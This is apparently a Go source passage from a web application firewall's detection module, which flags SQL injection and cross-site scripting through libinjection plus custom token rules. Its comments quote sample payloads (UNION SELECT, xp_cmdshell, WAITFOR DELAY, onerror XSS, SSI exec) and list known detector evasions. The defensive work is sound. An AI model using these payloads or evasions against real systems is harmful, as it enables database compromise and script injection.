package detect

import (
	"strings"

	libinjection "github.com/corazawaf/libinjection-go"

	"github.com/ergasterion-dev/aegolith/internal/model"
)

// SQLi reports whether v looks like SQL injection. It checks v and, when one
// percent-decoding pass changes it, the decoded value too.
func SQLi(v string) (Hit, bool) {
	if valueOrDecoded(v, isSQLi) {
		return Hit{RuleID: "AEG-SQLI-001", Category: model.CatSQLi, Severity: model.SeverityCritical}, true
	}
	return Hit{}, false
}

// XSS reports whether v looks like cross-site scripting. It checks v and,
// when one percent-decoding pass changes it, the decoded value too.
func XSS(v string) (Hit, bool) {
	if valueOrDecoded(v, isXSS) {
		return Hit{RuleID: "AEG-XSS-001", Category: model.CatXSS, Severity: model.SeverityHigh}, true
	}
	return Hit{}, false
}

// SQLiToken reports whether v holds a SQL time-delay or command-execution
// token (AEG-SQLI-002): MSSQL WAITFOR DELAY or WAITFOR TIME followed by a
// literal or a variable, MSSQL xp_cmdshell, a Postgres pg_sleep,
// pg_sleep_for or pg_sleep_until call, or an Oracle DBMS_LOCK.SLEEP or
// DBMS_SESSION.SLEEP call. It checks v and, when one percent-decoding pass
// changes it, the decoded value too. It is a detector of its own, not part
// of SQLi, so a value whose AEG-SQLI-001 hit a post-filter clears (percent
// text, bare number phrases), or a field where AEG-SQLI-001 is excluded,
// still gets it. See hasSQLToken for the matching rules and the accepted
// misses.
func SQLiToken(v string) (Hit, bool) {
	if valueOrDecoded(v, hasSQLToken) {
		return Hit{RuleID: "AEG-SQLI-002", Category: model.CatSQLi, Severity: model.SeverityCritical}, true
	}
	return Hit{}, false
}

// tokenGap bounds each gap hasSQLToken and hasSSIDirective skip between the
// parts of one token (blanks, and for SQL also /* */ and -- comments): a
// gap longer than this ends the match.
const tokenGap = 128

// hasSQLToken reports whether s holds one of the SQLiToken tokens. Every
// name is matched as a whole identifier, case-insensitively: the byte
// before it and the byte after it are not letters, digits or '_' (a '.' or
// a quote may be), so "WaitForDelete", "--waitforcert",
// "xp_cmdshell_proxy_account" and "pg_sleep_seconds" are not tokens. A name
// may be wrapped in double quotes ("pg_sleep", "DBMS_LOCK"."SLEEP").
//
//   - xp_cmdshell counts on its own, wherever it appears. **False-positive
//     cost:** text that names the procedure (a security article, a DBA
//     ticket: "is xp_cmdshell enabled?") is flagged.
//   - waitfor counts when DELAY or TIME follows, then a quote, N' or an
//     @variable: "WAITFOR DELAY '0:0:5'", "WAITFOR DELAY @d". "the WAITFOR
//     DELAY statement" and "WAITFOR DELAY 5" are clear.
//   - pg_sleep, pg_sleep_for and pg_sleep_until count when '(' follows.
//   - dbms_lock and dbms_session count when '.', sleep and '(' follow.
//
// Between the parts any blanks (space, tab, CR, LF, FF, VT), /* */
// comments and -- line comments are skipped, at most tokenGap bytes per
// gap. **False-positive cost:** SQL pasted into a support ticket or docs
// field that calls these ("SELECT pg_sleep(5)", "WAITFOR DELAY '00:00:05'")
// is flagged; exclude AEG-SQLI-002 on such a field.
//
// Accepted misses of AEG-SQLI-002 and AEG-SSTI-002 (the same list, word for
// word, is in docs/threat-model.md and testdata/corpus/README.md; the test
// lists are sqlTokenAcceptedMisses and ssiAcceptedMisses):
//
//  1. More than 128 bytes of blanks and comments in one gap between the
//     parts of a token: `WAITFOR`, 130 blanks, `DELAY '0:0:5'`;
//     `<!--#exec`, 130 blanks, `cmd="ls"-->`.
//  2. A SQL name built at run time or hidden in a literal:
//     `EXEC('xp_'+'cmdshell dir')`, `DECLARE @q varchar(99) SET
//     @q=0x7761... EXEC(@q)`, `U&"pg\005fsleep"(5)`.
//  3. A call with no `(` after the name, and `WAITFOR DELAY` or `WAITFOR
//     TIME` followed by anything but a quote, `N'` or an `@variable`:
//     `select pg_sleep`, `SELECT DBMS_LOCK.SLEEP FROM dual`, `WAITFOR DELAY
//     5`. None of these runs.
//  4. `+` as a blank outside a query or form value, where the engine does
//     not decode it: `waitfor+delay+'0:0:5'` in a path segment or a JSON
//     string.
//  5. Other procedures and delay functions: `xp_regread`, `xp_dirtree`,
//     `sp_OACreate`, `DBMS_PIPE.RECEIVE_MESSAGE(`, MySQL `SLEEP(` and
//     `BENCHMARK(`. libinjection (`AEG-SQLI-001`) flags some of them in SQL
//     context.
//  6. An SSI directive other than `exec`, `include`, `echo`, `printenv`,
//     `config`, `set`, `fsize` and `flastmod` (`<!--#if expr="..." -->`,
//     `<!--#elif`, nginx `<!--# block name="one" -->`), and a directive
//     whose first attribute is not one it takes (`<!--#exec foo="x"
//     cmd="ls" -->`).
//  7. An SSI opener written as HTML entities: `&lt;!--#exec cmd="ls"
//     --&gt;`. The engine does not decode entities.
//  8. A nested block comment between the parts of a SQL token: a comment
//     ends at the first `*/`, so `pg_sleep/* /* */ */(5)` and `WAITFOR /*
//     /* */ */ DELAY '0:0:5'` do not match. libinjection (`AEG-SQLI-001`)
//     flags both.
//
// Cost: one pass over the identifiers of s; each candidate name reads at
// most three gaps of tokenGap bytes and the words between them, so the scan
// is linear in len(s).
func hasSQLToken(s string) bool {
	for i := 0; i < len(s); i++ {
		if !isLetter(s[i]) || i > 0 && isIdentByte(s[i-1]) {
			continue
		}
		j := i
		for j < len(s) && isIdentByte(s[j]) {
			j++
		}
		if sqlTokenAt(s, i, j) {
			return true
		}
		i = j - 1
	}
	return false
}

// sqlTokenAt reports whether the identifier s[i:j] starts a SQLiToken
// token.
func sqlTokenAt(s string, i, j int) bool {
	if j-i < 7 || j-i > 14 { // len("waitfor") .. len("pg_sleep_until")
		return false
	}
	k := closeQuote(s, i, j)
	switch w := s[i:j]; {
	case strings.EqualFold(w, "xp_cmdshell"):
		return true
	case strings.EqualFold(w, "waitfor"):
		return waitforArgFollows(s, k)
	case strings.EqualFold(w, "pg_sleep"), strings.EqualFold(w, "pg_sleep_for"), strings.EqualFold(w, "pg_sleep_until"):
		return byteAfterGap(s, k, '(') >= 0
	case strings.EqualFold(w, "dbms_lock"), strings.EqualFold(w, "dbms_session"):
		d := byteAfterGap(s, k, '.')
		if d < 0 {
			return false
		}
		n, ok := skipTokenGap(s, d+1, true)
		if !ok {
			return false
		}
		open := s[n] == '"'
		if open {
			n++
		}
		e := n
		for e < len(s) && isIdentByte(s[e]) {
			e++
		}
		if !strings.EqualFold(s[n:e], "sleep") {
			return false
		}
		if open {
			if e >= len(s) || s[e] != '"' {
				return false
			}
			e++
		}
		return byteAfterGap(s, e, '(') >= 0
	}
	return false
}

// closeQuote returns j, or j+1 when the identifier s[i:j] is wrapped in
// double quotes ("pg_sleep").
func closeQuote(s string, i, j int) int {
	if i > 0 && s[i-1] == '"' && j < len(s) && s[j] == '"' {
		return j + 1
	}
	return j
}

// waitforArgFollows reports whether DELAY or TIME, then a quote, N' or an
// @variable follow position k (just past a WAITFOR).
func waitforArgFollows(s string, k int) bool {
	k, ok := skipTokenGap(s, k, true)
	if !ok {
		return false
	}
	e := k
	for e < len(s) && isIdentByte(s[e]) {
		e++
	}
	if w := s[k:e]; !strings.EqualFold(w, "delay") && !strings.EqualFold(w, "time") {
		return false
	}
	k, ok = skipTokenGap(s, e, true)
	if !ok {
		return false
	}
	switch c := s[k]; {
	case c == '\'' || c == '"':
		return true
	case c == 'N' || c == 'n':
		return k+1 < len(s) && s[k+1] == '\''
	case c == '@':
		return k+1 < len(s) && (isLetter(s[k+1]) || s[k+1] == '_')
	}
	return false
}

// byteAfterGap returns the index of c when it follows position k after a
// gap (skipTokenGap with SQL comments), or -1.
func byteAfterGap(s string, k int, c byte) int {
	k, ok := skipTokenGap(s, k, true)
	if !ok || s[k] != c {
		return -1
	}
	return k
}

// skipTokenGap skips blanks (space, tab, CR, LF, FF, VT) from i and, when
// sql is set, /* */ and -- line comments, reading at most tokenGap bytes.
// It returns the index of the first byte after the gap, with ok false when
// the gap reaches the end of s, runs past tokenGap bytes or holds a
// comment that does not close within them.
func skipTokenGap(s string, i int, sql bool) (next int, ok bool) {
	lim := min(len(s), i+tokenGap)
	for i < lim {
		switch c := s[i]; {
		case c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '\f' || c == '\v':
			i++
		case sql && c == '/' && i+1 < lim && s[i+1] == '*':
			e := strings.Index(s[i+2:lim], "*/")
			if e < 0 {
				return 0, false
			}
			i += 2 + e + 2
		case sql && c == '-' && i+1 < lim && s[i+1] == '-':
			e := strings.IndexByte(s[i+2:lim], '\n')
			if e < 0 {
				return 0, false
			}
			i += 2 + e + 1
		default:
			return i, true
		}
	}
	return 0, false
}

func isSQLi(s string) bool {
	if ok, fp := libinjection.IsSQLi(s); ok && !isProseNumberComment(s, fp) && !isProsePercent(s, fp) && !isBareNumberPhrase(s, fp) {
		return true
	}
	return hasStackedCopyProgram(s) || sqliFromKeywordStarts(s)
}

// isProsePercent reports whether a libinjection hit comes only from a '%'
// that prose writes as "percent": "Sale 20% (today only)" and "Cotton 95%
// (organic)" fold to "n1o(n" and "80% ACRYLIC AND 20% WOOL" to "1&1",
// because libinjection reads '%' as the modulo operator. The hit is dropped
// only when all of these hold:
//
//   - the fingerprint has no SQL keyword, function, string, comment or ';'
//     token: only names, numbers, operators, parentheses and AND/OR ("n",
//     "1", "o", "(", ")", "&"). "5 % (select 1)" folds to "1o(E1" and stays.
//     A '#' is libinjection's comment token, so it never gets this far.
//   - every '%' reads as a percent sign (see percentSignsOnly): it ends the
//     value, or is followed by ',', '.' or ')', or by a word or "(word" after
//     at most blanks. "1%1 or 1", "1 % 1 or 1 like 1", "1%(1) or 1" and
//     "1%x xor 1" (modulo between operands) stay.
//   - the value has no word that libinjection reads as a SQL comparison or
//     arithmetic operator (see hasSQLOperatorWord: like, rlike, regexp,
//     xor, div, mod, between, sounds, null).
//   - the value has no comment opener ("--", "/*"), no ';' and no quote other
//     than an apostrophe inside a word ("l'acidité", "d'AVOINE").
//   - the value has no SQL syntax lastSQLSyntax finds: no "1=1", "2>1",
//     "1<>2", "x(" or quoted word. "80% cotton or 1=1" and "1%1 or 1=1" stay.
//   - libinjection does not flag the value with every '%' read as a blank.
//
// Accepted cost: a value that starts with "N% (word)" or "N% word" and then
// writes a tautology with "or"/"and" and no comparison or operator word
// ("9% (a) or 1", "9% (a) or not 0", "9% (a) or 1 in (1)") is not flagged;
// it has the shape of "Sale 20% (today only)". One extra libinjection call,
// only for a value that holds a '%' and passes the cheaper checks: linear.
func isProsePercent(s, fp string) bool {
	if strings.IndexByte(s, '%') < 0 || !onlyArithmeticTokens(fp) || !percentSignsOnly(s) ||
		hasSQLOperatorWord(s) || hasSQLPunctuation(s) || lastSQLSyntax(s) >= 0 {
		return false
	}
	ok, _ := libinjection.IsSQLi(strings.ReplaceAll(s, "%", " "))
	return !ok
}

// percentSignsOnly reports whether every '%' in s is written the way prose
// writes a percent sign: at the end of the value, directly before ',', '.'
// or ')', or after blanks before a word ("20% WOOL", "79,4 %, sucre"), or
// before '(' and a word with blanks allowed around the '(' ("20% (today",
// "10%(x"). A digit after the '%' ("1%1", "1 % 1", "1%(1)") is modulo, and
// so is a word glued to the '%' ("1%x"). A "word" starts with an ASCII
// letter or a non-ASCII byte. Each '%' looks ahead over blanks only, and a
// blank run is skipped at most twice per '%', so the scan is linear.
func percentSignsOnly(s string) bool {
	skip := func(i int) int {
		for i < len(s) && isBlank(s[i]) {
			i++
		}
		return i
	}
	for i := strings.IndexByte(s, '%'); i >= 0; {
		j := i + 1
		switch {
		case j == len(s) || s[j] == ',' || s[j] == '.' || s[j] == ')':
		default:
			k := skip(j)
			if k < len(s) && s[k] == '(' {
				k = skip(k + 1)
			} else if k == j {
				return false // glued to the '%': "1%x", "1%1"
			}
			if k < len(s) && !isWordByte(s[k]) {
				return false
			}
		}
		n := strings.IndexByte(s[j:], '%')
		if n < 0 {
			break
		}
		i = j + n
	}
	return true
}

// hasSQLOperatorWord reports whether s holds, as a whole ASCII word, one of
// the words libinjection folds to a comparison or arithmetic operator and
// that prose rarely writes next to a percentage: like, rlike, regexp, xor,
// div, mod, between, sounds, null. "1%(1) or 1 like 1" folds to "1&1" with
// no '=' anywhere. Common English words that are also SQL operators (not,
// in, is) are not on the list; see isProsePercent's accepted cost. One pass.
func hasSQLOperatorWord(s string) bool {
	for i := 0; i < len(s); {
		if !isLetter(s[i]) {
			i++
			continue
		}
		j := i
		for j < len(s) && isIdentByte(s[j]) {
			j++
		}
		if i == 0 || !isIdentByte(s[i-1]) {
			switch strings.ToLower(s[i:j]) {
			case "like", "rlike", "regexp", "xor", "div", "mod", "between", "sounds", "null":
				return true
			}
		}
		i = j
	}
	return false
}

// isBareNumberPhrase reports whether a "1&1" hit is a bare list of numbers
// and ranges joined by "or"/"and", such as a size "6-7 or 8": every word is
// a number that starts with a digit, may hold '.', ',' and one inner '-'
// ("6-7", "1.5-2"), or the word "or" or "and" between two of them, and at
// least one number is a range or has a decimal separator. libinjection
// folds "6-7" to a number and reads the phrase like "1 or 1=1"; a
// comparison, a comment, a quote, a leading sign ("-1 or 1"), "||", or
// plain integers only ("99 or 1 or 1") keep it flagged.
//
// Accepted cost: a tautology with no comparison that has a range or a
// decimal in it ("1-1 or 1", "6-7 or 8 or 1", "1.0-1 or 1") has the same
// shape as "6-7 or 8" and is not flagged. A typed numeric field still
// rejects it through its schema. One pass over s.
func isBareNumberPhrase(s, fp string) bool {
	if fp != "1&1" {
		return false
	}
	words := strings.Fields(s)
	if len(words) < 3 || len(words)%2 == 0 {
		return false
	}
	shaped := false
	for i, w := range words {
		if i%2 == 1 {
			if !strings.EqualFold(w, "or") && !strings.EqualFold(w, "and") {
				return false
			}
			continue
		}
		if !isPlainNumberOrRange(w) {
			return false
		}
		shaped = shaped || strings.ContainsAny(w, "-.,")
	}
	return shaped
}

// isPlainNumberOrRange reports whether w is digits with optional '.' and ','
// separators and at most one inner '-' between digits: "8", "1.5", "79,4",
// "6-7", "1.5-2".
func isPlainNumberOrRange(w string) bool {
	dash := false
	for i := 0; i < len(w); i++ {
		c := w[i]
		switch {
		case c >= '0' && c <= '9':
		case (c == '.' || c == ',' || c == '-') && i > 0 && i < len(w)-1 && isDigit(w[i-1]) && isDigit(w[i+1]):
			if c == '-' {
				if dash {
					return false
				}
				dash = true
			}
		default:
			return false
		}
	}
	return len(w) > 0 && isDigit(w[0])
}

func isDigit(c byte) bool { return c >= '0' && c <= '9' }

// onlyArithmeticTokens reports whether a libinjection fingerprint holds
// only bareword, number, operator, parenthesis and logic-operator tokens,
// and at least one operator or logic operator.
func onlyArithmeticTokens(fp string) bool {
	op := false
	for i := 0; i < len(fp); i++ {
		switch fp[i] {
		case 'o', '&':
			op = true
		case 'n', '1', '(', ')':
		default:
			return false
		}
	}
	return op
}

// hasSQLPunctuation reports whether s holds a SQL comment opener ("--",
// "/*"), a ';', a double quote or backtick, or a single quote that is not
// an apostrophe between two letters. Letters here include any non-ASCII
// byte, so "l'été" and "d'AVOINE" count as words.
func hasSQLPunctuation(s string) bool {
	if strings.Contains(s, "--") || strings.Contains(s, "/*") || strings.ContainsAny(s, ";\"`") {
		return true
	}
	for i := strings.IndexByte(s, '\''); i >= 0; {
		if i == 0 || i == len(s)-1 || !isWordByte(s[i-1]) || !isWordByte(s[i+1]) {
			return true
		}
		n := strings.IndexByte(s[i+1:], '\'')
		if n < 0 {
			break
		}
		i += 1 + n
	}
	return false
}

func isWordByte(c byte) bool { return isLetter(c) || c >= 0x80 }

// maxSQLiStarts caps the extra libinjection calls sqliFromKeywordStarts
// makes on one value (one window, for a value the engine scans in windows)
// at both ends: the first maxSQLiStarts candidates and the last
// maxSQLiStarts are tried, at most 2*maxSQLiStarts calls.
const maxSQLiStarts = 8

// sqliStartWindow bounds how much of the value each extra libinjection call
// in sqliFromKeywordStarts reads, from its start offset. libinjection
// decides from the first five folded tokens, which in every injection shape
// here fit well inside it ("1 UNION SELECT username, password FROM
// users--" is 46 bytes).
const sqliStartWindow = 128

// sqliStart is one candidate start offset for sqliFromKeywordStarts: start
// is where libinjection reads from, kwEnd is just past the keyword that
// made it a candidate.
type sqliStart struct {
	start, kwEnd int
	union        bool
}

// sqliFromKeywordStarts finds a quote-free SQL injection that plain words in
// front of it hide from libinjection, e.g. "please send 1 UNION SELECT
// password FROM users--" or "milk 1; DROP TABLE orders;--". libinjection
// fingerprints a value from its first byte, so the leading words change the
// fingerprint; read from the "1" (or from "UNION") the same text is flagged.
//
// Candidate starts are SQL keywords that begin a word after a blank, a ';',
// a ')' or the end of an inline comment ("x 1/**/UNION/**/SELECT",
// "1)UNION SELECT"). When the keyword directly follows a number ("1 UNION",
// "1; DROP", "1 OR"), libinjection reads from the number instead, which is
// how such a payload closes a numeric context. Numbers alone are never
// candidates.
//
// Prose is full of these keywords, so a suffix hit counts only in two
// statement shapes prose does not write, and only keywords that can lead to
// one are candidates:
//
//   - UNION followed by SELECT, ALL or DISTINCT (see selectFollows), whose
//     fingerprint holds UNION and a SELECT-class expression ("UE"): "1 UNION
//     SELECT password FROM users". "please union select the best one" has no
//     such fingerprint, and "union union union" is never a candidate.
//   - union, select, drop, insert, update, delete, or, and, waitfor, exec or
//     declare when the value ends in a SQL comment that truncates the rest
//     of the query ("--" followed by no letters, or an unclosed "/*") and SQL
//     syntax (see lastSQLSyntax) sits between the keyword and that comment:
//     "1 OR 1=1--", "1; DROP TABLE orders;--", "1 AND SLEEP(5)--", "1; EXEC
//     xp_cmdshell 'dir'--". Prose such as "pick 2 or 3 --", "call me at 9;
//     drop me a line --" or "ok 1 and 2, thanks --" has no such syntax, and
//     "Pack of 2 -- fresh" has letters after the comment.
//
// A fingerprint shorter than three tokens (a lone "1c": "only 10 -- limited"
// read from "10") never counts, and isProseNumberComment applies as in
// isSQLi.
//
// Cost: two passes over s (the syntax scan and the candidate scan), then
// at most 2*maxSQLiStarts libinjection calls of at most sqliStartWindow
// bytes each: linear in len(s) with a small fixed bound on the extra
// libinjection work. The SELECT check after each UNION reads at most
// sqliStartWindow bytes and shares one forward search for "*/" across all
// of them (see selectFollows), and the walk back to a number reads only the
// gap before its keyword, so the candidate scan stays one pass. The first
// maxSQLiStarts candidates and the last maxSQLiStarts are tried, so padding on one side of the payload cannot push
// it out, and keywords that cannot lead to either shape (a "union" with no
// SELECT after it, a keyword with no SQL syntax after it) are not
// candidates, so they cannot be used as padding at all. Hiding a payload
// takes more than maxSQLiStarts candidates that do not trigger on BOTH
// sides of it, each a UNION SELECT or a keyword before SQL syntax.
func sqliFromKeywordStarts(s string) bool {
	end, tail := trailingSQLComment(s)
	lastSyntax := -1
	if tail {
		lastSyntax = lastSQLSyntax(s[:end])
		// A ';' that ends the last statement ("orders;--").
		k := end
		for k > 0 && isBlank(s[k-1]) {
			k--
		}
		if k > 0 && s[k-1] == ';' {
			lastSyntax = max(lastSyntax, k-1)
		}
	}
	var ring [maxSQLiStarts]sqliStart
	n := 0
	var closes commentCloses // shared by selectFollows across the scan
	for i := 1; i < end; i++ {
		if p := s[i-1]; !isLetter(s[i]) || !isBlank(p) && p != ';' && p != ')' && !strings.HasSuffix(s[:i], "*/") {
			continue
		}
		j := i
		for j < end && isIdentByte(s[j]) {
			j++
		}
		kw := s[i:j]
		i = j - 1
		union := strings.EqualFold(kw, "union") && selectFollows(s[:end], j, &closes)
		if !union && !(tail && lastSyntax >= j && isSQLiStartKeyword(kw)) {
			continue
		}
		st := sqliStart{start: numberBefore(s, j-len(kw)), kwEnd: j, union: union}
		if n < maxSQLiStarts {
			if sqliStartMatches(s, st, tail, lastSyntax) {
				return true
			}
		} else {
			ring[n%maxSQLiStarts] = st
		}
		n++
	}
	// The last candidates, past the first maxSQLiStarts already tried.
	for k := maxSQLiStarts; k < min(n, 2*maxSQLiStarts); k++ {
		if sqliStartMatches(s, ring[(n-1-(k-maxSQLiStarts))%maxSQLiStarts], tail, lastSyntax) {
			return true
		}
	}
	return false
}

// sqliStartMatches runs libinjection on at most sqliStartWindow bytes from
// st.start and applies sqliFromKeywordStarts's statement-shape guards.
func sqliStartMatches(s string, st sqliStart, tail bool, lastSyntax int) bool {
	sub := s[st.start:min(len(s), st.start+sqliStartWindow)]
	ok, fp := libinjection.IsSQLi(sub)
	if !ok || len(fp) < 3 || isProseNumberComment(sub, fp) {
		return false
	}
	return st.union && strings.Contains(fp, "UE") || tail && lastSyntax >= st.kwEnd
}

// selectFollows reports whether the text of s after a UNION ending at
// s[j] starts with SELECT, ALL or DISTINCT after blanks, inline comments or
// '(' ("UNION SELECT", "UNION/**/SELECT", "UNION ALL SELECT", "UNION
// (SELECT"). It reads at most sqliStartWindow bytes from j, all that the
// libinjection call for this start would read anyway, and finds the end of
// each comment through c, which the calls of one scan share.
func selectFollows(s string, j int, c *commentCloses) bool {
	hi := min(len(s), j+sqliStartWindow)
	for i := j; i < hi; {
		switch {
		case isBlank(s[i]) || s[i] == '(':
			i++
		case strings.HasPrefix(s[i:], "/*"):
			k := c.after(s, i+2)
			if k+2 > hi {
				return false
			}
			i = k + 2
		default:
			return wordAt(s[:hi], i, "select") || wordAt(s[:hi], i, "all") || wordAt(s[:hi], i, "distinct")
		}
	}
	return false
}

// commentCloses finds the next "*/" in one value for a scan that asks with
// (mostly) increasing positions. It remembers the last answer: at is the
// first "*/" at or after from (len(s) when there is none). Without it each
// UNION in "union /* union /* ..." searched to the end of the value, which
// is quadratic.
type commentCloses struct {
	from, at int
	set      bool
}

// after returns the index of the first "*/" at or after p, or len(s). A p
// inside [from, at] is answered from the cache. A p past at searches
// forward from p; positions only grow there, so those searches never cover
// a byte twice. A p before from (a later UNION inside the window of an
// earlier one, at most sqliStartWindow back) searches only up to from,
// where the cached answer takes over. Total work stays linear in len(s).
func (c *commentCloses) after(s string, p int) int {
	switch {
	case c.set && p >= c.from && p <= c.at:
		return c.at
	case c.set && p < c.from:
		if k := strings.Index(s[p:min(len(s), c.from+1)], "*/"); k >= 0 {
			c.from, c.at = p, p+k
		} else {
			c.from = p
		}
		return c.at
	}
	c.from, c.set = p, true
	if k := strings.Index(s[p:], "*/"); k >= 0 {
		c.at = p + k
	} else {
		c.at = len(s)
	}
	return c.at
}

// trailingSQLComment reports whether s ends in a SQL comment that cuts off
// the rest of a query: a "--" followed by no letters ("--", "-- -", "--+")
// or a "/*" that never closes. end is where that comment starts, or len(s).
func trailingSQLComment(s string) (end int, ok bool) {
	end = len(s)
	if i := strings.LastIndex(s, "--"); i >= 0 && !hasLetter(s[i+2:]) {
		end, ok = i, true
	}
	if i := strings.LastIndex(s, "/*"); i >= 0 && i < end && !strings.Contains(s[i+2:], "*/") {
		end, ok = i, true
	}
	return end, ok
}

// numberBefore returns the start of a number token that directly precedes
// the word at s[i], separated by blanks and at most one ';' ("1 UNION",
// "1; DROP"), or i when there is none. It only walks back over the gap
// between the word and the token before it, so the walks of successive
// words never overlap.
func numberBefore(s string, i int) int {
	k := i
	for k > 0 && isBlank(s[k-1]) {
		k--
	}
	if k > 0 && s[k-1] == ';' {
		k--
		for k > 0 && isBlank(s[k-1]) {
			k--
		}
	}
	m := k
	for m > 0 && s[m-1] >= '0' && s[m-1] <= '9' {
		m--
	}
	if m == k || m > 0 && !isBlank(s[m-1]) && s[m-1] != ';' {
		return i
	}
	return m
}

func isSQLiStartKeyword(w string) bool {
	for _, k := range [...]string{"union", "select", "drop", "insert", "update", "delete", "or", "and", "waitfor", "exec", "declare"} {
		if strings.EqualFold(w, k) {
			return true
		}
	}
	return false
}

// lastSQLSyntax returns the index of the last byte of SQL syntax in s that
// prose does not write, or -1:
//
//   - a comparison operator (a run of = < > !) with an operand directly on
//     both sides that are both numbers ("1=1", "2>1"), both single-quoted
//     strings ("'a'='a'") or the same name ("x=x"). "2=fine" and "size=2"
//     are how prose writes a key and value.
//   - a '(' directly after a name ("SLEEP(5)", "pg_sleep(").
//   - a closing single quote of a quoted word with no blank and at least one
//     non-digit in it ("'dir'", "'0:0:5'"); an apostrophe between two letters
//     ("don't", "I'd") neither opens nor closes one. Double quotes never
//     count: prose quotes words with them ("say \"yes\"", "\"2\"").
//
// Commas, a '(' after a blank and a spaced "=" are left to prose. One pass;
// operand checks look at most maxOperand bytes to each side, so the scan is
// linear.
func lastSQLSyntax(s string) int {
	last := -1
	open := -1 // index of a pending opening single quote
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c == '\'':
			prevLetter := i > 0 && isLetter(s[i-1])
			nextLetter := i+1 < len(s) && isLetter(s[i+1])
			switch {
			case prevLetter && nextLetter:
				// apostrophe inside a word
			case open >= 0:
				if !nextLetter && isQuotedWord(s[open+1:i]) {
					last = i
				}
				open = -1
			case !prevLetter:
				open = i
			}
		case c == '(':
			if i > 0 && isIdentByte(s[i-1]) {
				last = i
			}
		case isCmpByte(c) && (i == 0 || !isCmpByte(s[i-1])):
			j := i
			for j < len(s) && isCmpByte(s[j]) {
				j++
			}
			if comparesLikeSQL(s, i, j) {
				last = j - 1
			}
			i = j - 1
		}
	}
	return last
}

// maxOperand bounds how far comparesLikeSQL looks for an operand.
const maxOperand = 64

// comparesLikeSQL reports whether the comparison operator s[i:j] has, directly
// on both sides, two numbers, two single-quoted strings or the same name.
func comparesLikeSQL(s string, i, j int) bool {
	if i == 0 || j >= len(s) {
		return false
	}
	lk, l := operandBefore(s, i)
	rk, r := operandAfter(s, j)
	if lk == 0 || lk != rk {
		return false
	}
	return lk != 'n' || strings.EqualFold(l, r)
}

// operandBefore classifies the operand ending at s[i-1]: '1' for a number,
// 's' for a single-quoted string, 'n' for a name, 0 for anything else. It
// returns the operand text too.
func operandBefore(s string, i int) (byte, string) {
	lo := max(0, i-maxOperand)
	if s[i-1] == '\'' {
		k := strings.LastIndexByte(s[lo:i-1], '\'')
		if k < 0 {
			return 0, ""
		}
		return 's', s[lo+k : i]
	}
	k := i
	for k > lo && isIdentByte(s[k-1]) {
		k--
	}
	return operandKind(s[k:i]), s[k:i]
}

// operandAfter is operandBefore for the operand starting at s[j].
func operandAfter(s string, j int) (byte, string) {
	hi := min(len(s), j+maxOperand)
	if s[j] == '\'' {
		k := strings.IndexByte(s[j+1:hi], '\'')
		if k < 0 {
			return 0, ""
		}
		return 's', s[j : j+k+2]
	}
	k := j
	for k < hi && isIdentByte(s[k]) {
		k++
	}
	return operandKind(s[j:k]), s[j:k]
}

func operandKind(w string) byte {
	if w == "" {
		return 0
	}
	for i := 0; i < len(w); i++ {
		if w[i] < '0' || w[i] > '9' {
			return 'n'
		}
	}
	return '1'
}

// isQuotedWord reports whether w, the text between two single quotes, is a
// single non-empty token with at least one non-digit ("dir", "0:0:5").
func isQuotedWord(w string) bool {
	if w == "" {
		return false
	}
	nonDigit := false
	for i := 0; i < len(w); i++ {
		if isBlank(w[i]) {
			return false
		}
		if w[i] < '0' || w[i] > '9' {
			nonDigit = true
		}
	}
	return nonDigit
}

func isCmpByte(c byte) bool { return c == '=' || c == '<' || c == '>' || c == '!' }

func isLetter(c byte) bool { return c|0x20 >= 'a' && c|0x20 <= 'z' }

func hasLetter(s string) bool {
	for i := 0; i < len(s); i++ {
		if isLetter(s[i]) {
			return true
		}
	}
	return false
}

// isProseNumberComment reports whether a libinjection hit with fingerprint
// "1c" (a number followed by a comment) is prose such as "10% off --
// limited": a letter appears before the comment token. libinjection folds
// the words in between away, so "10% off --" and "5--" share the
// fingerprint, but only the bare form ("5--", "1 /* x */") is an injection
// that comments out the rest of a query; those keep matching. A typed
// integer field still rejects "10% off --" through its schema.
func isProseNumberComment(s, fp string) bool {
	if fp != "1c" {
		return false
	}
	end := len(s)
	for _, tok := range [...]string{"--", "/*", "#"} {
		if n := strings.Index(s, tok); n >= 0 && n < end {
			end = n
		}
	}
	for i := 0; i < end; i++ {
		if c := s[i] | 0x20; c >= 'a' && c <= 'z' {
			return true
		}
	}
	return false
}

func isXSS(s string) bool {
	return libinjection.IsXSS(s) && !isInertMarkup(s) || isScriptURL(s) || hasScriptTagAnywhere(s)
}

// inertPlaceholderTags are libinjection black tags that do nothing without
// an attribute: no URL to load, no handler to run. Docs and issue text use
// them as placeholders or type names ("- [Docs]: <link>", "an `<Object>`",
// "rebase onto <base>"). STYLE, SCRIPT, IFRAME, SVG and the other black
// tags are not on the list: their content or a later child can run code.
var inertPlaceholderTags = [...]string{"link", "base", "object", "meta", "embed"}

// isInertMarkup reports whether a libinjection XSS hit rests only on markup
// that cannot run code. The hit is dropped only when all of these hold:
//
//   - the value has no NUL byte (libinjection skips NULs inside comment
//     terminators and tag names, which this scan does not model).
//   - the value holds no "<script", no javascript:/vbscript: and no
//     on<event>= or formaction= attribute text anywhere (hasXSSMarker), so
//     "<link> onload=alert(1)" and "<!--` onerror=alert(1)" stay caught.
//   - at least one of these was masked (see maskInertMarkup):
//     a backtick inside an HTML comment ("<!-- see the `main` branch -->",
//     closed by "-->" or "-!>", or open to the end of the value) or inside
//     a bogus comment that libinjection reads the same way ("<!" or "<?" up
//     to the first '>', as in the regex "`(?<![\w.])`"), which libinjection
//     flags because old IE ended a tag at a backtick; a bare
//     placeholder tag from inertPlaceholderTags written as "<name>", only
//     when no tag in the value has an attribute; or a "<!DOCTYPE" with no
//     '>' and no '[' after it anywhere in the value (a mention, not a
//     declaration: "<!DOCTYPE x [" opens an internal subset and stays).
//     Comment backticks are not masked at all when the value opens a
//     raw-text or form element (see hasCommentHidingOpener): inside
//     "<title>" a browser reads "<!--" as text, so in
//     "<title><!--</title><img src=x onerror=alert(1)>`-->" the image runs
//     while libinjection sees a comment.
//   - libinjection does not flag the masked value: a real tag, attribute,
//     javascript: URL or IE conditional comment ("<!--[if") outside the
//     masked bytes keeps the hit ("<!-- x --><img src=x onerror=alert(1)>",
//     "<a href=`javascript:alert(1)`>").
//   - when a comment backtick was masked, libinjection does not flag the
//     masked value with every "<!--", "-->" and "-!>" blanked either, so
//     markup inside a comment counts as live (old IE ended the comment at
//     the backtick; "<!-->" closes at once in HTML5). A "<link>"
